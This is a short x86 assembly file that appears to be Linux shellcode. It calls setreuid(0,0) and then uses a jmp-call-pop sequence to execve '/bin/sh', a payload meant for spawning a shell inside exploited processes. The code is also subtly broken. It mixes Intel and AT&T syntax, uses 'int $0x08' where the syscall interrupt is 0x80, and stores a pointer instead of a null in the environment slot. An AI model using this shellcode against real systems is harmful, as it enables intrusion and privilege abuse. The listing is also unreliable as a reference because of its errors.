.section .data
.section .text
.globl _start

_start:
    xor eax, eax
    mov al, 70
    xor %ebx, %ebx
    xor %ecx, %ecx
    int $0x80

    jmp ender

starter:
    popl %ebx
    xor %eax, %eax
    mov %al, 0x07(%ebx)
    movl %ebx, 0x08(%ebx)
    movl %ebx, 0x0c(%ebx)
    mov $11, %al
    lea 0x08(%ebx), %ecx
    lea 0x0c(%ebx), %edx
    int $0x08

ender:
    call starter
    
.string "/bin/shNAAAABBBB"

